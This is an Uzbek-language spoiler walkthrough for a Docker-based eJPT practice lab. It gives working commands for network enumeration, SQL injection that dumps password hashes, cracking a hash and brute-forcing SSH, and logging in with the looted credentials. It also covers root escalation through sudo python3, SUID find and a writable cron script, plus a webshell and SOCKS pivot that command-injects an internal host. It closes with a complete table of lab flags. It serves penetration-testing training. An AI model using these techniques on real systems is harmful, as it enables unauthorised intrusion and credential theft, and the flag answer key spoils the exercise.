# eJPT Amaliy Lab — To'liq Yechim (SPOYLER)

> Avval o'zingiz urinib ko'ring! Bu yerda barcha kill-chain'lar batafsil.
> Buyruqlar `ejpt-attacker` konteyneridan bajariladi (`docker exec -it ejpt-attacker bash`).

## 0) Host discovery + enumeration

```bash
nmap -sn 172.20.0.0/24                      # tirik hostlar: .10 .20 .30 (+ .5 o'zingiz)
nmap -sV -p- 172.20.0.10 172.20.0.20 172.20.0.30
```

- 172.20.0.10 — 80 (http, ACME CMS), 22 (ssh)
- 172.20.0.20 — 21 (ftp), 22 (ssh)
- 172.20.0.30 — 445/139 (smb), 22 (ssh)

---

## 1) web-01 (172.20.0.10) — web SQLi → hash → crack → SSH → root

Bu mashina **oson emas**: web zaifligidan foydalanib parol HASH'ini sizib
chiqarasiz, uni buzasiz (crack), so'ng shu parol bilan SSH qilasiz.

**Enum:** homepage'da ko'rsatkich yo'q — kataloglarni topish kerak:
```bash
dirb http://172.20.0.10 /root/dirs.txt      # -> /search.php (yashirin), /dashboard.php, /uploads/
```

**a) SQLi (UNION) — parol HASH'larini dump qilish:** `search.php?q=` 2 ustunli (name, price):
```bash
curl "http://172.20.0.10/search.php?q=%25'%20UNION%20SELECT%20username,password%20FROM%20users--%20-"
# -> admin    : $1$acme01$LKXfufFStU2JIHhZ8jBW2/
#    sysadmin : $1$acme02$uiKoWRDnmr5mUs9ngQm3C.   (md5crypt — ochiq matn EMAS!)
#    editor   : $1$acme03$xE1wR2RXoF42CJ0i6pHPh/
```

**b) Hash'ni buzish (john + wordlist):**
```bash
echo 'sysadmin:$1$acme02$uiKoWRDnmr5mUs9ngQm3C.' > h.txt
john --wordlist=/root/wordlist.txt h.txt
john --show h.txt          # -> sysadmin:Ac3m3S3rv3r!
```

**c) SSH — buzilgan parol bilan foothold:**
```bash
sshpass -p 'Ac3m3S3rv3r!' ssh sysadmin@172.20.0.10
cat /var/www/html/user.txt
```
➡️ **USER flag:** `EJPT{w3b_upl04d_rce_www_data}`
> (Muqobil yo'l: `dashboard.php`da fayl upload → PHP webshell → `www-data` — xuddi shu user flag.)

**d) Privesc — sudo python3 (GTFOBins):**
```bash
sudo -l                                     # (root) NOPASSWD: /usr/bin/python3
sudo python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
cat /root/root.txt
```
➡️ **ROOT flag:** `EJPT{w3b01_sud0_pyth0n_r00t}`

> web-01 root/sysadmin ichki tarmoqqa (10.10.10.0/24) ulangan — bu **pivot nuqtasi** (5-bo'lim).

---

## 2) linux-02 (172.20.0.20) — FTP hint + SSH → SUID find → root

**a) Anonim FTP:**
```bash
ftp 172.20.0.20        # user: anonymous, parol: (bo'sh)
# get note_to_bob.txt  -> "parolingni o'zgartir — 'football' juda oddiy!"
```
Yoki brute-force: `hydra -l bob -P /root/wordlist.txt ssh://172.20.0.20` → `bob:football`.

**b) Foothold:**
```bash
sshpass -p football ssh bob@172.20.0.20
cat /home/bob/user.txt
```
➡️ **USER flag:** `EJPT{ftp_ssh_cr4ck_f00th0ld}`

**c) Privesc — SUID find:**
```bash
find / -perm -4000 -type f 2>/dev/null      # -> /usr/bin/find SUID!
find . -exec /bin/sh -p \;                  # root shell (euid=0)
cat /root/root.txt
```
➡️ **ROOT flag:** `EJPT{su1d_f1nd_r00t_esc}`

---

## 3) smb-03 (172.20.0.30) — SMB null session → cred → root

**a) SMB enumeration (null session):**
```bash
smbclient -L //172.20.0.30 -N              # share: public
smbclient //172.20.0.30/public -N
smb: \> get credentials.txt
# -> carol : Fil3s3rv3r2025
```

**b) Foothold:**
```bash
sshpass -p Fil3s3rv3r2025 ssh carol@172.20.0.30
cat /home/carol/user.txt
```
➡️ **USER flag:** `EJPT{smb_null_cr3ds_l00t}`

**c) Privesc — yoziladigan root skript (cron-simulyatsiya):**
```bash
ls -la /opt/maintenance/cleanup.sh          # -rwxrwxrwx, root har 20s ishga tushiradi
echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' > /opt/maintenance/cleanup.sh
sleep 25
/tmp/rootbash -p                            # euid=0
cat /root/root.txt
```
➡️ **ROOT flag:** `EJPT{cr0n_wr1t4bl3_r00t}`

---

## 4) PIVOT: web-01 → internal-04 (10.10.10.20) — FINAL

`internal-04` hujumchi tarmog'ida **yo'q** — u faqat `internalnet`da. web-01 esa ikkala tarmoqda. Shuning uchun web-01'ni "ko'prik" qilamiz.

**Eng oddiy yo'l (web-01 shell orqali):**
```bash
# web-01'dagi webshell (yoki sysadmin ssh) ichki hostni ko'radi:
curl "http://172.20.0.10/uploads/sh.php?c=curl -s http://10.10.10.20:8080/"
# Command injection (ping ?host= zaif):
curl "http://172.20.0.10/uploads/sh.php?c=curl -s 'http://10.10.10.20:8080/ping?host=127.0.0.1;cat /flag.txt'"
```

**"Toza" pivot (proxychains + ssh dynamic port forward):**
```bash
# web-01'da sysadmin bilan SOCKS proxy ochamiz:
sshpass -p 'Ac3m3S3rv3r!' ssh -f -N -D 1080 sysadmin@172.20.0.10
# /etc/proxychains.conf: socks5 127.0.0.1 1080
proxychains curl "http://10.10.10.20:8080/ping?host=127.0.0.1;cat /flag.txt"
```
➡️ **FINAL flag:** `EJPT{p1v0t_1nt3rnal_cmd1nj}`

---

## Barcha flaglar

| # | Mashina | Flag |
|---|---|---|
| 1 | web-01 (user) | `EJPT{w3b_upl04d_rce_www_data}` |
| 2 | web-01 (root) | `EJPT{w3b01_sud0_pyth0n_r00t}` |
| 3 | linux-02 (user) | `EJPT{ftp_ssh_cr4ck_f00th0ld}` |
| 4 | linux-02 (root) | `EJPT{su1d_f1nd_r00t_esc}` |
| 5 | smb-03 (user) | `EJPT{smb_null_cr3ds_l00t}` |
| 6 | smb-03 (root) | `EJPT{cr0n_wr1t4bl3_r00t}` |
| 7 | internal-04 (final) | `EJPT{p1v0t_1nt3rnal_cmd1nj}` |

Flaglarni portalning **«Amaliy Lab»** sahifasida topshirib, progressni kuzating.
